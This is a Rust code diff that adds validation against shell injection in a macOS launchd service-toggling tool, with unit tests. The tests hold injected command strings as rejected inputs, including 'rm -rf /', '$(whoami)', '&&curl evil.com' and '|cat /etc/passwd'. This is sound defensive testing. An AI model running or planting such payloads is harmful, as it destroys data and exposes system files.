@@ -570,6 +570,39 @@ pub fn is_label_toggleable(label: &str) -> bool {
     !DENIED_LABEL_PREFIXES.iter().any(|denied| label.starts_with(denied))
 }
 
+/// Returns true if every character in `s` is safe in a launchd label:
+/// ASCII alphanumeric, dot, hyphen, or underscore. Rejects anything that
+/// could act as a shell metacharacter when interpolated into a command string.
+fn is_safe_label_chars(s: &str) -> bool {
+    !s.is_empty()
+        && s.chars()
+            .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-' || c == '_')
+}
+
+/// Returns true if `target` matches the expected launchctl service target format:
+///   gui/<digits>/<label>
+///   user/<digits>/<label>
+///   system/<label>
+/// where <label> passes is_safe_label_chars. Rejects any string that would
+/// carry metacharacters into the osascript do-shell-script argument.
+fn is_safe_service_target(target: &str) -> bool {
+    if let Some(rest) = target.strip_prefix("system/") {
+        return is_safe_label_chars(rest);
+    }
+    for prefix in &["gui/", "user/"] {
+        if let Some(rest) = target.strip_prefix(prefix) {
+            if let Some(slash_pos) = rest.find('/') {
+                let uid_part = &rest[..slash_pos];
+                let label_part = &rest[slash_pos + 1..];
+                return !uid_part.is_empty()
+                    && uid_part.chars().all(|c| c.is_ascii_digit())
+                    && is_safe_label_chars(label_part);
+            }
+        }
+    }
+    false
+}
+
 #[derive(Debug, Clone, Copy, PartialEq)]
 pub enum ToggleAction {
     Disable,
@@ -595,6 +628,22 @@ pub fn toggle_launchctl(
             action,
             success: false,
             error: Some(format!("label '{}' is in denylist (system service)", label)),
+        };
+    }
+
+    // Reject labels or service targets that contain shell metacharacters. Both
+    // values flow into an osascript `do shell script "..."` argument when
+    // requires_sudo is true; a malformed plist label could otherwise inject
+    // arbitrary commands with administrator privileges.
+    if !is_safe_label_chars(label) || !is_safe_service_target(service_target) {
+        return ToggleResult {
+            label: label.to_string(),
+            action,
+            success: false,
+            error: Some(format!(
+                "rejected: '{}' contains characters not permitted in a launchd service target",
+                label
+            )),
         };
     }
 
@@ -678,7 +727,7 @@ fn log_audit_toggle(
 
 #[cfg(test)]
 mod tests {
-    use super::{check_path, is_label_toggleable};
+    use super::{check_path, is_label_toggleable, is_safe_label_chars, is_safe_service_target};
 
     #[test]
     fn allowed_cache_prefix() {
@@ -745,5 +794,57 @@ mod tests {
         assert!(is_label_toggleable("com.perplexity.comet"));
         assert!(is_label_toggleable("com.tailscale.tailscaled"));
         assert!(is_label_toggleable("com.dr.buho.BuhoCleaner.helper"));
+    }
+
+    // ── Service-target whitelist validation ───────────────────────────────────
+
+    #[test]
+    fn valid_service_targets_accepted() {
+        assert!(is_safe_service_target("system/com.tailscale.tailscaled"));
+        assert!(is_safe_service_target("gui/501/com.brave.Browser.helper"));
+        assert!(is_safe_service_target("user/502/org.mozilla.updater"));
+        assert!(is_safe_service_target("gui/1000/com.example.app-name_v2"));
+    }
+
+    #[test]
+    fn shell_injection_via_semicolon_rejected() {
+        assert!(!is_safe_service_target("gui/501/com.foo; rm -rf /"));
+        assert!(!is_safe_label_chars("com.foo; rm -rf /"));
+    }
+
+    #[test]
+    fn shell_injection_via_subshell_rejected() {
+        assert!(!is_safe_service_target("gui/501/com.foo$(whoami)"));
+        assert!(!is_safe_service_target("gui/501/com.foo`id`"));
+        assert!(!is_safe_label_chars("com.foo$(whoami)"));
+    }
+
+    #[test]
+    fn shell_injection_via_pipe_and_ampersand_rejected() {
+        assert!(!is_safe_service_target("gui/501/com.foo&&curl evil.com"));
+        assert!(!is_safe_service_target("gui/501/com.foo|cat /etc/passwd"));
+    }
+
+    #[test]
+    fn shell_injection_via_quotes_rejected() {
+        assert!(!is_safe_service_target("gui/501/'com.foo'"));
+        assert!(!is_safe_service_target("gui/501/com.foo\"bar"));
+        assert!(!is_safe_label_chars("'com.foo'"));
+    }
+
+    #[test]
+    fn malformed_target_structure_rejected() {
+        assert!(!is_safe_service_target(""));
+        assert!(!is_safe_service_target("gui/abc/com.foo")); // non-numeric uid
+        assert!(!is_safe_service_target("gui/com.foo"));    // missing uid segment
+        assert!(!is_safe_service_target("bad/501/com.foo")); // unknown domain
+        assert!(!is_safe_service_target("system/"));        // empty label
+    }
+
+    #[test]
+    fn empty_and_space_labels_rejected() {
+        assert!(!is_safe_label_chars(""));
+        assert!(!is_safe_label_chars("com.foo bar"));
+        assert!(!is_safe_label_chars("com.foo\tbar"));
     }
 }
